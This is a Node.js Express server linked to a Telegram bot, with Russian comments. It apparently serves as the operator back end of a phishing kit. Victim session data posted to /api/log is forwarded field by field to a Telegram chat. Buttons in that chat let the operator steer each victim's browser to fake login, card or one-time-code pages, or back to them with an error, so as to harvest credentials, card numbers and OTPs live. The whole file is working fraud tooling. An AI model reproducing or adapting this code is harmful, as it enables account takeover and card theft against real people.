const express = require('express');
const bodyParser = require('body-parser');
const TelegramBot = require('node-telegram-bot-api');
const fs = require('fs');
const path = require('path');
const cors = require('cors');

const config = JSON.parse(fs.readFileSync(path.join(__dirname, 'config.json')));
const app = express();
const port = 3000;

app.use(bodyParser.json());
app.use(cors());

const bot = new TelegramBot(config.token, { polling: true });
const logsPath = path.join(__dirname, 'logs.json');

const readLogs = () => {
    if (fs.existsSync(logsPath)) {
        const data = fs.readFileSync(logsPath);
        if (data.length === 0) return {};
        return JSON.parse(data);
    }
    return {};
};

const writeLogs = (data) => {
    fs.writeFileSync(logsPath, JSON.stringify(data, null, 2));
};

const waitingForCustomText = {}; // Объект для хранения состояния ожидания кастомного текста

app.post('/api/log', (req, res) => {
    console.log('Received body:', req.body);
    const userData = req.body;

    const logs = readLogs();
    const { sessionId } = userData;
    if (!logs[sessionId]) {
        logs[sessionId] = {};
    }

    Object.assign(logs[sessionId], userData);

    let message = '';
    for (const [key, value] of Object.entries(logs[sessionId])) {
        if (!key.endsWith('path') && key !== 'redirectPath' && key !== 'waitingForCustomText' && key !== 'customResponse') {
            message += `<b>${key}</b>: <code>${value}</code>\n`;
        }
    }

    const options = {
        parse_mode: 'HTML', // Указываем, что используем HTML
        reply_markup: {
            inline_keyboard: [
                [
                    { text: '🔓 LOGIN', callback_data: `login:${sessionId}` },
                    { text: '❌ INVALID LOGIN', callback_data: `invalid_login:${sessionId}` },
                ],
                [
                    { text: '💳 CARD', callback_data: `card:${sessionId}` },
                    { text: '❌ INVALID CARD', callback_data: `invalid_card:${sessionId}` },
                ],
                [
                    { text: '✉ OTP', callback_data: `otp:${sessionId}` },
                    { text: '❌ OTP INVALID', callback_data: `otp_invalid:${sessionId}` },
                ],
                [
                    { text: '✍️ Custom Text', callback_data: `custom:${sessionId}` },
                    { text: '➡️ Custom', callback_data: `go_to_custom:${sessionId}` },
                ],
            ],
        },
    };

    bot.sendMessage(config.chatId, message, options);
    writeLogs(logs);

    console.log(`Data logged for sessionId: ${sessionId}`);
    res.status(200).json({ message: 'Data received successfully' });
});

app.get('/api/action', (req, res) => {
    const { sessionId } = req.query;
    const logs = readLogs();

    if (!logs[sessionId]) {
        console.log(`Session not found for sessionId: ${sessionId}`);
        return res.status(404).json({ message: 'Session not found' });
    }

    const responseData = {
        sessionId: sessionId,
        data: logs[sessionId],
        customText: logs[sessionId].customText || null,
        redirectPath: logs[sessionId].redirectPath || null // Возвращаем путь для кастомной страницы
    };

    // Очищаем redirectPath, если он не пустой
    if (logs[sessionId].redirectPath) {
        console.log(`Clearing redirectPath for sessionId: ${sessionId}`);
        logs[sessionId].redirectPath = null; // Очищаем redirectPath
        writeLogs(logs);
    }

    console.log(`Session data retrieved for sessionId: ${sessionId}`);
    res.status(200).json(responseData);
});

bot.on('callback_query', (callbackQuery) => {
    const data = callbackQuery.data.split(':');
    const action = data[0];
    const sessionId = data[1];
    const logs = readLogs();

    if (!logs[sessionId]) {
        bot.sendMessage(callbackQuery.message.chat.id, 'Session not found.');
        console.log(`Callback action: ${action} - Session not found for sessionId: ${sessionId}`);
        return;
    }

    let redirectPath = '';
    switch (action) {
        case 'custom':
            bot.sendMessage(callbackQuery.message.chat.id, 'Введите кастомный текст:');
            waitingForCustomText[callbackQuery.message.chat.id] = sessionId; // Сохраняем sessionId для текущего чата
            logs[sessionId].waitingForCustomText = true; // Устанавливаем состояние ожидания
            writeLogs(logs);
            console.log(`Waiting for custom text for sessionId: ${sessionId}`);
            return;
        case 'login':
            redirectPath = logs[sessionId].login_path;
            bot.sendMessage(callbackQuery.message.chat.id, `➡️ Отправляем на Login | ID: ${sessionId} 👤`);
            console.log(`Redirecting to login path: ${redirectPath}`);
            break;
        case 'invalid_login':
            redirectPath = `${logs[sessionId].login_path}#error`;
            bot.sendMessage(callbackQuery.message.chat.id, `➡️ Отправляем на Login | ID: ${sessionId} 👤`);
            console.log(`Redirecting to invalid login path: ${redirectPath}`);
            break;
        case 'card':
            redirectPath = logs[sessionId].card_path;
            bot.sendMessage(callbackQuery.message.chat.id, `➡️ Отправляем на Card | ID: ${sessionId} 👤`);
            console.log(`Redirecting to card path: ${redirectPath}`);
            break;
        case 'invalid_card':
            redirectPath = `${logs[sessionId].card_path}#error`;
            bot.sendMessage(callbackQuery.message.chat.id, `➡️ Отправляем на Card | ID: ${sessionId} 👤`);
            console.log(`Redirecting to invalid card path: ${redirectPath}`);
            break;
        case 'otp':
            redirectPath = logs[sessionId].otp_path;
            bot.sendMessage(callbackQuery.message.chat.id, `➡️ Отправляем на OTP | ID: ${sessionId} 👤`);
            console.log(`Redirecting to OTP path: ${redirectPath}`);
            break;
        case 'otp_invalid':
            redirectPath = `${logs[sessionId].otp_path}#error`;
            bot.sendMessage(callbackQuery.message.chat.id, `➡️ Отправляем на OTP | ID: ${sessionId} 👤`);
            console.log(`Redirecting to invalid OTP path: ${redirectPath}`);
            break;
        case 'go_to_custom':
            redirectPath = logs[sessionId].custom_path; // Получаем путь для кастомной страницы
            bot.sendMessage(callbackQuery.message.chat.id, `➡️ Отправляем на Custom | ID: ${sessionId} 👤`);
            console.log(`Redirecting to custom path: ${redirectPath}`);
            break;
    }

    // Сохраняем redirectPath в объекте сессии
    if (redirectPath) {
        logs[sessionId].redirectPath = redirectPath; // Сохраняем путь
        writeLogs(logs);
    }

    console.log(`Callback action: ${action}, Session ID: ${sessionId}, Redirecting to: ${redirectPath}`);
});

bot.on('message', (msg) => {
    const sessionId = waitingForCustomText[msg.chat.id]; // Получаем sessionId из объекта состояния
    const logs = readLogs();

    if (sessionId && logs[sessionId] && logs[sessionId].waitingForCustomText) {
        const customText = msg.text;
        logs[sessionId].waitingForCustomText = false; // Сбрасываем состояние ожидания
        logs[sessionId].customText = customText;

        // Сохраняем кастомный текст и выводим сообщение
        bot.sendMessage(msg.chat.id, `Кастомный текст сохранен: \`${customText}\``);
        writeLogs(logs);
        console.log(`Custom text saved: ${customText}`);
        delete waitingForCustomText[msg.chat.id]; // Удаляем sessionId из состояния
    } else {
        console.log(`Received message: ${msg.text} from sessionId: ${sessionId} without waiting for custom text.`);
    }
});

app.listen(port, () => {
    console.log(`Server is running on http://localhost:${port}`);
});
